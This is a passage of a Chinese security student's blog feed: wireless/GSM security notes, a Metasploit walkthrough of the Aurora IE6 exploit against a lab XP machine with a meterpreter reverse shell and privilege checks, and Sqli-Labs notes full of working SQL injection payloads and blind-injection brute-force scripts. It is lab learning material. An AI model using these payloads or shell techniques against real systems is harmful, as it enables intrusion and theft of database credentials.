Network</code>(WPAN)</p><p>传输距离：10m左右；</p><p>技术：IEEE 802.15，蓝牙，ZigBee</p><p>传输速度：10Mbit/s</p></li><li><p>无线局域网<code>Wireless Local Area Network</code>(WLAN)</p><p>传输距离：几十米-几千米；</p><p>技术：IEEE 802.11</p><p>传输速率：11Mbit.s-1Gbit/s</p></li><li><p>无线城域网<code>Wireless Metropolitan Area Network</code>(WMAN)</p><p>传输距离：城市大部分地区</p><p>技术：IEEE 802.16</p></li><li><p>无线广域网<code>Wireless Wide Area Network</code>(WWAN)</p><p>传输距离：移动卫星通信</p><p>技术：2G,3G(2M/S),4G(几十到几百M/S)</p></li></ol><h2 id="WLAN安全机制"><a href="#WLAN安全机制" class="headerlink" title="WLAN安全机制"></a>WLAN安全机制</h2><h3 id="WEP的安全问题"><a href="#WEP的安全问题" class="headerlink" title="WEP的安全问题"></a>WEP的安全问题</h3><h4 id="RC4的安全问题"><a href="#RC4的安全问题" class="headerlink" title="RC4的安全问题"></a>RC4的安全问题</h4><p><img src="https://s2.ax1x.com/2019/05/18/EX9M3q.png" alt="EX9M3q.png"></p><h4 id="无抗重放攻击"><a href="#无抗重放攻击" class="headerlink" title="无抗重放攻击"></a>无抗重放攻击</h4><p><img src="https://s2.ax1x.com/2019/05/18/EXkN1s.png" alt="EXkN1s.png"></p><h4 id="sk的产生和分发"><a href="#sk的产生和分发" class="headerlink" title="sk的产生和分发"></a>sk的产生和分发</h4><p><img src="https://s2.ax1x.com/2019/05/18/EXkT4e.png" alt="EXkT4e.png"></p><h4 id="IV空间太小"><a href="#IV空间太小" class="headerlink" title="IV空间太小"></a>IV空间太小</h4><p><img src="https://s2.ax1x.com/2019/05/18/EXkvHf.png" alt="EXkvHf.png"></p><h4 id="CRC32是线性的"><a href="#CRC32是线性的" class="headerlink" title="CRC32是线性的"></a>CRC32是线性的</h4><p><img src="https://s2.ax1x.com/2019/05/18/EXAp4g.png" alt="EXAp4g.png"></p><h3 id="WEP认证机制"><a href="#WEP认证机制" class="headerlink" title="WEP认证机制"></a>WEP认证机制</h3><h4 id="开放系统认证（默认）"><a href="#开放系统认证（默认）" class="headerlink" title="开放系统认证（默认）"></a>开放系统认证（默认）</h4><p>认证以明文形式传输</p><p>适合安全需求较低的场合</p><p><img src="https://s2.ax1x.com/2019/05/18/EXEesI.png" alt="EXEesI.png"></p><h4 id="共享密钥认证"><a href="#共享密钥认证" class="headerlink" title="共享密钥认证"></a>共享密钥认证</h4><p>以WEP为基础，基于挑战响应机制</p><p><img src="https://s2.ax1x.com/2019/05/18/EXEZQA.png" alt="EXEZQA.png"></p><h3 id="TKIP机密机制"><a href="#TKIP机密机制" class="headerlink" title="TKIP机密机制"></a>TKIP机密机制</h3><p>包裹在WEP外面的一层算法（既要兼容WEP又要解决WEP安全问题的产物）</p><h4 id="TKIP的改进"><a href="#TKIP的改进" class="headerlink" title="TKIP的改进"></a>TKIP的改进</h4><ul><li>IV：24bit-&gt;48bit</li><li>WEP密钥sk：40bit-&gt;104bit</li><li>四个新算法<img src="https://s2.ax1x.com/2019/05/18/EXEqmt.png" alt="EXEqmt.png"></li></ul><h3 id="IEEE802-11i认证和密钥交换协议"><a href="#IEEE802-11i认证和密钥交换协议" class="headerlink" title="IEEE802.11i认证和密钥交换协议"></a>IEEE802.11i认证和密钥交换协议</h3><p>四步握手过程：</p><p><img src="https://s2.ax1x.com/2019/05/18/EXZIsA.png" alt="EXZIsA.png"></p><p><img src="https://s2.ax1x.com/2019/05/18/EXZbIf.png" alt="EXZbIf.png"></p><h2 id="GSM安全（2G）"><a href="#GSM安全（2G）" class="headerlink" title="GSM安全（2G）"></a>GSM安全（2G）</h2><h3 id="GSM的鉴权机制"><a href="#GSM的鉴权机制" class="headerlink" title="GSM的鉴权机制"></a>GSM的鉴权机制</h3><p><img src="https://s2.ax1x.com/2019/05/18/EXKk7R.png" alt="EXKk7R.png"></p><h3 id="GSM加密机制"><a href="#GSM加密机制" class="headerlink" title="GSM加密机制"></a>GSM加密机制</h3><p><img src="https://s2.ax1x.com/2019/05/18/EXKfu4.png" alt="EXKfu4.png"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>待我Web安全学成归来，必会回首再来看你！！！！<del>(手动狗头)</del></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因考试复习而生的一篇博客…
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="操作系统安全" scheme="https://gardenia30.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="移动网络安全" scheme="https://gardenia30.top/tags/%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit学习笔记-极光漏洞渗透</title>
    <link href="https://gardenia30.top/2019/04/18/Metasploit%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%85%89%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/"/>
    <id>https://gardenia30.top/2019/04/18/Metasploit学习笔记-极光漏洞渗透/</id>
    <published>2019-04-18T08:37:22.000Z</published>
    <updated>2019-04-23T10:58:27.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Do you konw Aurora?<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>其实就是记录一下一次动手操作的过程；</p><h2 id="主机连通性测试"><a href="#主机连通性测试" class="headerlink" title="主机连通性测试"></a>主机连通性测试</h2><p>1.KALI主机IP为192.168.175.151，配置默认网关为192.168.175.2；</p><p>2.xp主机的IP为192.168.175.158，配置默认网关为192.168.175.2；</p><p>互相可以ping通：</p><p><img src="https://s2.ax1x.com/2019/04/17/Axhz5t.png" alt="Axhz5t.png"></p><p><img src="https://s2.ax1x.com/2019/04/17/AxhXbd.png" alt="AxhXbd.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>因为目标明确，就是利用XP主机的IE浏览器的极光漏洞，编号：ms10-002，所以步骤如下：</p><p>1.加载msf，查找极光漏洞模块；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax5pw9.png" alt="Ax5pw9.png"></p><p>2.利用极光漏洞模块；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax53Sf.png" alt="Ax53Sf.png"></p><p>3.查看模块信息；发现必须要是IE6版本才可以利用此漏洞，所以此次才会选择XP作为靶机；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax5DpV.png" alt="Ax5DpV.png"></p><p>4.查看此次可以利用到的payload，可以看到有许多选项，利用一个即可；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax5I1K.png" alt="Ax5I1K.png"></p><p>5.选择使用<code>windows/meterpreter/reverse_tcp</code>这个payload，查看详细信息；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxIgv8.png" alt="AxIgv8.png"></p><p>6.payload利用；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxITCq.png" alt="AxITCq.png"></p><p>7.查看此次攻击需要配置的信息；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxIvVJ.png" alt="AxIvVJ.png"></p><p>7.需要设置的是<code>SRVHOST,URIPATH,LHOST</code>，分别对应：KALI主机本身的IP，URL路径，监听主机的IP；设置参数如下：</p><p><img src="https://s2.ax1x.com/2019/04/17/AxobFA.png" alt="AxobFA.png"></p><p>8.exploit；此时本机的4444端口用于监听会话；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxoxOS.png" alt="AxoxOS.png"></p><p>9.在靶机XP中的IE浏览器访问此URL；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxTlf1.png" alt="AxTlf1.png"></p><p>10.查看msf的监听结果：</p><p><img src="https://s2.ax1x.com/2019/04/17/AxT8l6.png" alt="AxT8l6.png"></p><p>11.查看当前会话，<code>sessions -l</code>；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax7Ku8.png" alt="Ax7Ku8.png"></p><p>12.aurora攻击中，利用的是IE的缓冲区溢出漏洞，exploit的时候IE会处于阻塞状态，若关闭IE则会话会马上终止，所以需要及时转移会话，继续保持对目标主机的控制。使用migrate可以将meterpreter会话从一个进程移植到另一个进程的内存空间中</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax7fbD.png" alt="Ax7fbD.png"></p><p><img src="https://s2.ax1x.com/2019/04/17/Ax7TPA.png" alt="Ax7TPA.png"></p><p>13.此处将会话迁移到文件资源管理器进程的内存空间中(explorer.exe)；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxH1sK.png" alt="AxH1sK.png"></p><p>此时会话已经迁移，IE浏览器会自动关闭；</p><p>14.提权</p><blockquote><p>getuid 可以查看权限；</p><p>getpid 查看进程号 ；</p></blockquote><p><img src="https://s2.ax1x.com/2019/04/17/Axq1ED.png" alt="Axq1ED.png"></p><p>此时已经获得了XP系统的NT AUTHORITY\SYSTEM权限</p><p>15.创建后门，清除日志</p><p>待学习…</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Do you konw Aurora?
    
    </summary>
    
      <category term="Metasploit学习" scheme="https://gardenia30.top/categories/Metasploit%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Metasploit" scheme="https://gardenia30.top/tags/Metasploit/"/>
    
      <category term="内网渗透" scheme="https://gardenia30.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs通关笔记</title>
    <link href="https://gardenia30.top/2019/04/03/Sqli-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/04/03/Sqli-Labs学习笔记/</id>
    <published>2019-04-03T03:36:53.000Z</published>
    <updated>2019-11-10T11:22:45.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>利用Sqli-labs帮助理解sql注入的相关知识~<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p> 是一个简答的字符型注入，GET传参<code>id=1‘</code>，发现报错：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL<br>server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>既然报错了就很简单了，直接注释掉后面的引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27--+</span><br></pre></td></tr></table></figure><p>回显正常，说明确实是字符型注入，接下来就是用<code>order by</code>查询当前表有几个字段；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27 order by 3--+</span><br></pre></td></tr></table></figure><p>到3列为止没有任何问题，到4为止就报错：</p><blockquote><p>Unknown column ‘4’ in ‘order clause’</p></blockquote><p>说明只有3列，那就可以直接用<code>union select</code>进行查询了，这里需要将union select前面的查询语句置空，这样的话，查询的结果就都是union select之后的查询内容了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>这里的回显结果为2和3，这样的话我们可以直接利用这两个位置进行回显自己想要的数据，得到数据库名和数据库用户名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,database(),user()--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:security<br>Your Password:root@localhost</p></blockquote><p>接下来就是使用系统数据库的一些表单进行更深入的查询了，一般的顺序就是：<code>爆库-&gt;爆表-&gt;爆列-&gt;爆数据</code>；其实到上述为止已经爆库了；</p><p>接下来是用系统数据库进行查询的一系列步骤：</p><ol><li><p>爆库名（此处爆的是mysql中所有的数据库，而database()只能做到查询到当前库的名字）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:information_schema,challenges,mysql,performance_schema,security<br>Your Password:3</p></blockquote></li><li><p>爆表名（information_schema数据库里的tables表里的table_name和table_schema列）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:emails,referers,uagents,users<br>Your Password:3</p></blockquote></li><li><p>爆列名（information_schema数据库里的columns表里的column列）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:id,username,password<br>Your Password:3</p></blockquote></li><li><p>爆数值（知道了所有的信息：库名，表名，列名，列出合格的查询语句即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><blockquote><p>name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p></blockquote></li></ol><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>尝试<code>?id=1‘</code>，<code>?id=1&#39;--+</code>发现全都报错，猜测是数字型注入；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>发现确实是数字型注入，然后重复less-1的操作即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>尝试<code>?id=1&#39;</code>，<code>?id=1&#39;--+</code>都报错</p><blockquote><p>You have an error in your SQL syntax; check the<br>manual that corresponds to your MySQL server version for the right<br>syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</p></blockquote><p>尝试<code>?id=1&#39;)--+</code>成功回显，查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>果然是需要闭合一个引号和括号，接下来就是和less-1一样的操作；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>查看源代码，在$id左右加上双引号和括号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="小结1"><a href="#小结1" class="headerlink" title="小结1"></a>小结1</h2><p>这部分的注入非常基础和简单，只要熟悉<code>mysql</code>中的<code>information_schema</code>数据库，善于利用<code>order by</code>去查询列数，然后直接用<code>information_schema</code>数据库里的数据表去结合<code>union select</code>查询就好；</p><h2 id="less-5-盲注-单引号"><a href="#less-5-盲注-单引号" class="headerlink" title="less-5(盲注-单引号)"></a>less-5(盲注-单引号)</h2><p>从这里开始就需要使用到sql盲注的知识了，先介绍几个需要用到的常用的函数：</p><blockquote><p>left(a,b) //从左开始截取a的前b位</p><p>ascii() //将单个字符转换为ASCII码</p><p>substr(str,pos,len) //将str字符串截断，从pos位开始取len个字符（开始为1）</p><p>length() //返回字符串的长度</p><p>sleep(n) //将程序挂起一段时间，n为n秒</p><p>if(a,b,c) //如果a=true，则执行b，否则执行c</p></blockquote><p>这里输入<code>?id=1&#39;</code>发现报错，直接注释掉后面的语句<code>?id=1&#39;--+</code>，回显<code>You are in...........</code>；由此得到此题为盲注的类型，直接查询肯定是看不到的，但是可以判断输入的查询语句的结果是否为真，这样的话就可以使用盲注的思路来解决此题：</p><h3 id="solution1-构造逻辑判断"><a href="#solution1-构造逻辑判断" class="headerlink" title="solution1(构造逻辑判断)"></a>solution1(构造逻辑判断)</h3><p>先测试数据库的名字（此处省去二分查找的过程）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><p>回显：<code>You are in...........</code>所以数据库的名字的第一个字母为s，接下来再次测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),2,1))=101--+</span><br></pre></td></tr></table></figure><p>得到数据库名字的第二个字母为e，所以接下来就按照这种方法去测试下面的几个字母就可以很容易的得到数据库的名字，这里就不一一去尝试了，贴上爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/sqli-labs-master/Less-5/?id=1' and ascii(substr(database(),&#123;len&#125;,1))=&#123;ascii&#125;--+"</span></span><br><span class="line">database_name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">database_name+=chr(j)</span><br><span class="line"><span class="keyword">print</span> database_name</span><br></pre></td></tr></table></figure><p>得到库名：security，用此方法即可推出表名和列名，只是暴力破解需要时间，慢慢爆破是肯定可以的,给出<strong>payload：</strong><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),&#123;len&#125;,1))=&#123;ascii&#125; --+"</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">table_name+=chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br></pre></td></tr></table></figure><p>爆破出表名：</p><p><img src="https://s2.ax1x.com/2019/03/07/kxfRDU.png" alt="kxfRDU.png"></p><p>总的来说，这个方法的主要思路就是：在构造数据库查询语句结果为true和false的时候回显页面不一样，这样的话就可以通过构造逻辑判断的方法来一个个猜测字段的名称，从而达到获取敏感信息的目的；</p><h3 id="solution2-concat函数报错注入"><a href="#solution2-concat函数报错注入" class="headerlink" title="solution2(concat函数报错注入)"></a>solution2(concat函数报错注入)</h3><p>基于concat报错的注入时，利用的是MySQL的一个bug，rand()值不固定，需要多试几次(固定格式，换掉检索内容即可，报错内容和原因有待研究…)</p><p>爆库payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>得到本数据库名称：</p><blockquote><p>Duplicate entry ‘::security::1’ for key ‘group_key’</p></blockquote><p>爆表payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>得到关键数据表名称：</p><blockquote><p>Duplicate entry ‘::users::0’ for key ‘group_key’</p></blockquote><p>爆列payload3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>得到关键列名：</p><blockquote><p>Duplicate entry ‘::username::0’ for key ‘group_key’</p><p>Duplicate entry ‘::password::0’ for key ‘group_key’</p></blockquote><p>爆数据payload4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select username from users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select password from users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>只能通过控制limit的数值查看不同的行数，不可以用group_concat，得到结果：</p><blockquote><p>Duplicate entry ‘::Angelina::1’ for key ‘group_key’</p><p>Duplicate entry ‘::I-kill-you::0’ for key ‘group_key’</p></blockquote><h3 id="solution3-xpath函数报错注入"><a href="#solution3-xpath函数报错注入" class="headerlink" title="solution3(xpath函数报错注入)"></a>solution3(xpath函数报错注入)</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>爆库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select database() limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns  where table_name=&apos;users&apos; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select username from users limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select password from users limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>得到关键信息：</p><blockquote><p>XPATH syntax error: ‘~Dummy~’</p><p>XPATH syntax error: ‘~p@ssword~’</p></blockquote><p>调整limit参数即可查询不同的行信息；</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>和updatexml一样，继续注入即可，不再赘述……</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(payload),0x7e))--+</span><br></pre></td></tr></table></figure><h3 id="solution4-bigint溢出报错注入"><a href="#solution4-bigint溢出报错注入" class="headerlink" title="solution4(bigint溢出报错注入)"></a>solution4(bigint溢出报错注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (!(select * from (select user())x) - ~0),2,3--+</span><br></pre></td></tr></table></figure><p>暂未成功，待更……</p><h3 id="soultion5-double类型溢出报错"><a href="#soultion5-double类型溢出报错" class="headerlink" title="soultion5(double类型溢出报错)"></a>soultion5(double类型溢出报错)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+</span><br></pre></td></tr></table></figure><p>暂未成功，待更……</p><h3 id="solution6-利用数据的重复性报错"><a href="#solution6-利用数据的重复性报错" class="headerlink" title="solution6(利用数据的重复性报错)"></a>solution6(利用数据的重复性报错)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure><p>暂未成功，只能注出mysql版本，待更……</p><h3 id="solution7-延时注入"><a href="#solution7-延时注入" class="headerlink" title="solution7(延时注入)"></a>solution7(延时注入)</h3><p>如果第一个判断为true，则立即返回，若为flase，则会有5秒的延时，后面基本就和solution1一致，不再赘述；给出payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><h2 id="less-6-盲注-双引号"><a href="#less-6-盲注-双引号" class="headerlink" title="less-6(盲注-双引号)"></a>less-6(盲注-双引号)</h2><p>除了是双引号闭合，其他和less-5一样，不再赘述……</p><h2 id="less-7-文件导入导出"><a href="#less-7-文件导入导出" class="headerlink" title="less-7(文件导入导出)"></a>less-7(文件导入导出)</h2><p>尝试<code>id=1&#39;</code>报错，<code>id=1&#39;--+</code>依然报错，<code>id=1&quot;</code>不报错，那方向还是在单引号上，查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>发现可以构造<code>id=1&#39;))</code>进行闭合，这里有一个小技巧，就是如何判断是否需要闭合括号，尝试<code>id=1&#39; and 1=1--+</code>，注释以后任然报错，说明是有括号的，逐个加括号测试即可；</p><p>然后就是进行数据库导出文件，尝试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>发现mysql报错，指定路径下也没有该文件，可能原因如下：</p><h3 id="First"><a href="#First" class="headerlink" title="First"></a>First</h3><p>猜想：可能是权限不够，需要root权限才可以对数据库进行读写，用以下语句测试权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and (select 